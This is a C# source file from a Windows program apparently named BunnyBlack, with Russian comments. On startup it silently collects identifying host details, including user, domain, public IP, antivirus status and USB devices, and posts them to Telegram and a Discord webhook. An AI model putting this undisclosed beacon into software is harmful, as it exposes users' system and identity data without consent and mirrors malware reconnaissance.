// language: C#, file: Core/DiscordLogger.cs
// Полная замена.
// Вебхук + дублирование в Telegram.
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Text;
using System.Windows.Forms;
using Newtonsoft.Json;

namespace BunnyBlack.Core
{
    public static class DiscordLogger
    {
        // ============================================================
        // ВЕБХУК
        // ============================================================
        private const string WebhookUrl = "";

        private const int HttpTimeoutSec = 10;
        private const int LogMaxBytes = 1_048_576;
        private const int DiscordMaxLen = 1900;

        // ============================================================
        // ГЛАВНЫЙ ВЫЗОВ
        // ============================================================
        public static void SendStartupLog()
        {
            try
            {
                string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                string machineName = Environment.MachineName;
                string userName = Environment.UserName;
                string domain = Environment.UserDomainName;
                string drivePath = Path.GetPathRoot(Application.ExecutablePath);
                string osVersion = GetWindowsVersion();
                string cpuModel = GetCpuModel();
                string ramInfo = GetRamInfo();
                string ipAddress = GetPublicIp();
                string antivirusStatus = GetAntivirusStatus();
                string winRE = RegistryHelper.IsWinReEnvironment() ? "Да (WinRE)" : "Нет";
                string dotnetVersion = Environment.Version.ToString();
                string version = GetVersion();

                string message = $@"
**BunnyBlack — Запуск программы**
═══════════════════════════════════
🖥 **Компьютер:** `{machineName}`
👤 **Пользователь:** `{userName}`
🏢 **Домен:** `{domain}`
📂 **Диск запуска:** `{drivePath}`
🕒 **Время:** `{timestamp}`
⏳ **Аптайм:** `{GetSystemUptime()}`
🪟 **ОС:** `{osVersion}`
💾 **Процессор:** `{cpuModel}`
🧠 **ОЗУ:** `{ramInfo}`
💿 **Свободно на C:\:** `{GetSystemDriveFreeSpace()}`
📊 **Активных процессов:** `{Process.GetProcesses().Length}`
🌐 **IP-адрес:** `{ipAddress}`
🛡 **Антивирус:** `{antivirusStatus}`
🔄 **WinRE:** `{winRE}`
📦 **Версия .NET:** `{dotnetVersion}`
📦 **Версия программы:** `{version}`
🆕 **Первый запуск:** `{IsFirstRun()}`
🔌 **USB-устройства:** `{GetUsbDevices()}`
═══════════════════════════════════
";

                // === Telegram — первым, потому что он надёжнее ===
                bool tgSent = false;
                try
                {
                    if (TelegramNotifier.IsConfigured())
                    {
                        tgSent = TelegramNotifier.SendAsync(message).GetAwaiter().GetResult();
                        BbLog.Info($"[DiscordLogger] Telegram send: {(tgSent ? "OK" : "FAIL")}");
                    }
                }
                catch (Exception ex) { BbLog.Error("[DiscordLogger/Telegram]", ex); }

                // === Discord — вторым ===
                bool dcSent = false;
                try { dcSent = SendInChunks(WebhookUrl, message); }
                catch (Exception ex) { BbLog.Error("[DiscordLogger/Discord]", ex); }

                // === Если никуда не ушло — сохраняем локально ===
                if (!tgSent && !dcSent)
                    SaveLogLocally(message);
            }
            catch (Exception ex)
            {
                BbLog.Error("[DiscordLogger.SendStartupLog]", ex);
                SaveLogLocally("⚠️ Ошибка отправки лога: " + ex.Message);
            }
        }

        // ============================================================
        // ЧАНКИ DISCORD
        // ============================================================
        private static bool SendInChunks(string url, string content)
        {
            if (string.IsNullOrWhiteSpace(url)) return false;
            if (string.IsNullOrEmpty(content)) return false;

            if (content.Length <= DiscordMaxLen)
                return SendToWebhook(url, content);

            var chunks = new List<string>();
            int pos = 0;
            while (pos < content.Length)
            {
                int len = Math.Min(DiscordMaxLen, content.Length - pos);
                if (pos + len < content.Length)
                {
                    int lastNl = content.LastIndexOf('\n', pos + len - 1, len);
                    if (lastNl > pos) len = lastNl - pos + 1;
                }
                chunks.Add(content.Substring(pos, len));
                pos += len;
            }

            bool allOk = true;
            for (int i = 0; i < chunks.Count; i++)
            {
                string header = chunks.Count > 1 ? $"**[{i + 1}/{chunks.Count}]**\n" : "";
                if (!SendToWebhook(url, header + chunks[i])) allOk = false;
                System.Threading.Thread.Sleep(300);
            }
            return allOk;
        }

        private static bool SendToWebhook(string url, string content)
        {
            if (string.IsNullOrWhiteSpace(url)) return false;
            try
            {
                using (var client = new HttpClient { Timeout = TimeSpan.FromSeconds(HttpTimeoutSec) })
                {
                    var payload = new { content = content, username = "BunnyBlack Logger" };
                    string json = JsonConvert.SerializeObject(payload);
                    using (var body = new StringContent(json, Encoding.UTF8, "application/json"))
                    {
                        var resp = client.PostAsync(url, body).GetAwaiter().GetResult();
                        return resp.IsSuccessStatusCode;
                    }
                }
            }
            catch (Exception ex) { BbLog.Error("[DiscordLogger.SendToWebhook]", ex); return false; }
        }

        // ============================================================
        // ЛОКАЛЬНЫЙ ЛОГ
        // ============================================================
        private static void SaveLogLocally(string content)
        {
            try
            {
                string dir = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "BunnyBlack", "logs");
                Directory.CreateDirectory(dir);
                string file = Path.Combine(dir, $"startup_{DateTime.Now:yyyyMMdd}.log");

                if (File.Exists(file) && new FileInfo(file).Length > LogMaxBytes)
                {
                    string old = file + ".old";
                    if (File.Exists(old)) File.Delete(old);
                    File.Move(file, old);
                }

                File.AppendAllText(file, content + Environment.NewLine +
                    new string('=', 50) + Environment.NewLine);
            }
            catch (Exception ex) { BbLog.Error("[SaveLogLocally]", ex); }
        }

        // ============================================================
        // ВСПОМОГАТЕЛЬНЫЕ
        // ============================================================
        private static string GetVersion()
        {
            try
            {
                var asm = Assembly.GetExecutingAssembly();
                var fvi = FileVersionInfo.GetVersionInfo(asm.Location);
                return fvi.ProductVersion ?? "1.0.0";
            }
            catch { return "1.0.0"; }
        }

        private static string GetWindowsVersion()
        {
            try
            {
                using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(
                    @"SOFTWARE\Microsoft\Windows NT\CurrentVersion"))
                {
                    if (key == null) return Environment.OSVersion.VersionString;
                    string p = key.GetValue("ProductName")?.ToString() ?? "?";
                    string b = key.GetValue("CurrentBuild")?.ToString() ?? "";
                    string u = key.GetValue("UBR")?.ToString() ?? "";
                    return $"{p} (Сборка {b}.{u})";
                }
            }
            catch { return Environment.OSVersion.VersionString; }
        }

        private static string GetCpuModel()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT Name FROM Win32_Processor"))
                    foreach (var o in searcher.Get()) return o["Name"]?.ToString() ?? "?";
            }
            catch { }
            return "?";
        }

        private static string GetRamInfo()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher(
                    "SELECT TotalPhysicalMemory FROM Win32_ComputerSystem"))
                    foreach (var o in searcher.Get())
                    {
                        ulong b = Convert.ToUInt64(o["TotalPhysicalMemory"]);
                        return $"{b / (1024.0 * 1024.0 * 1024.0):F1} ГБ";
                    }
            }
            catch { }
            return "?";
        }

        private static string GetPublicIp()
        {
            try
            {
                using (var c = new HttpClient { Timeout = TimeSpan.FromSeconds(HttpTimeoutSec) })
                {
                    var resp = c.GetAsync("https://api.ipify.org").GetAwaiter().GetResult();
                    return resp.Content.ReadAsStringAsync().GetAwaiter().GetResult().Trim();
                }
            }
            catch
            {
                try
                {
                    foreach (var ni in NetworkInterface.GetAllNetworkInterfaces())
                    {
                        if (ni.OperationalStatus != OperationalStatus.Up) continue;
                        foreach (var ip in ni.GetIPProperties().UnicastAddresses)
                            if (ip.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                                return ip.Address.ToString();
                    }
                }
                catch { }
                return "N/A";
            }
        }

        private static string GetAntivirusStatus()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher(
                    "SELECT DisplayName, ProductState FROM Win32_AntiVirusProduct"))
                    foreach (var o in searcher.Get())
                    {
                        string n = o["DisplayName"]?.ToString() ?? "?";
                        uint st = Convert.ToUInt32(o["ProductState"]);
                        bool on = (st & 0x10) != 0;
                        return on ? $"Включён ({n})" : $"Отключён ({n})";
                    }
            }
            catch { }
            return "Н/Д";
        }

        private static string GetSystemUptime()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher(
                    "SELECT LastBootUpTime FROM Win32_OperatingSystem"))
                    foreach (var o in searcher.Get())
                    {
                        string boot = o["LastBootUpTime"]?.ToString() ?? "";
                        if (DateTime.TryParseExact(boot.Substring(0, 14), "yyyyMMddHHmmss",
                            null, System.Globalization.DateTimeStyles.None, out DateTime t))
                        {
                            var up = DateTime.Now - t;
                            return $"{up.Days}д {up.Hours}ч {up.Minutes}м";
                        }
                    }
            }
            catch { }
            return "?";
        }

        private static string GetSystemDriveFreeSpace()
        {
            try
            {
                var d = new DriveInfo("C");
                if (d.IsReady)
                {
                    long free = d.TotalFreeSpace, total = d.TotalSize;
                    return $"{FormatBytes(free)} ({(double)free / total * 100:F1}%)";
                }
            }
            catch { }
            return "?";
        }

        private static string FormatBytes(long bytes)
        {
            string[] sizes = { "Б", "КБ", "МБ", "ГБ", "ТБ" };
            double len = bytes; int o = 0;
            while (len >= 1024 && o < sizes.Length - 1) { o++; len /= 1024; }
            return $"{len:0.##} {sizes[o]}";
        }

        private static bool IsFirstRun()
        {
            try
            {
                using (var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"SOFTWARE\BunnyBlack"))
                {
                    if (key == null) return true;
                    if (key.GetValue("FirstRun") == null)
                    {
                        key.SetValue("FirstRun", "Выполнено");
                        return true;
                    }
                    return false;
                }
            }
            catch { return false; }
        }

        private static string GetUsbDevices()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT Name FROM Win32_USBHub"))
                {
                    var list = new List<string>();
                    foreach (var o in searcher.Get())
                    {
                        string n = o["Name"]?.ToString() ?? "";
                        if (!string.IsNullOrEmpty(n))
                        {
                            string sn = n.Split(new[] { '(', '[' })[0].Trim();
                            if (!list.Contains(sn)) list.Add(sn);
                        }
                    }
                    return list.Count > 0 ? string.Join(", ", list) : "Нет";
                }
            }
            catch { return "Н/Д"; }
        }
    }
}
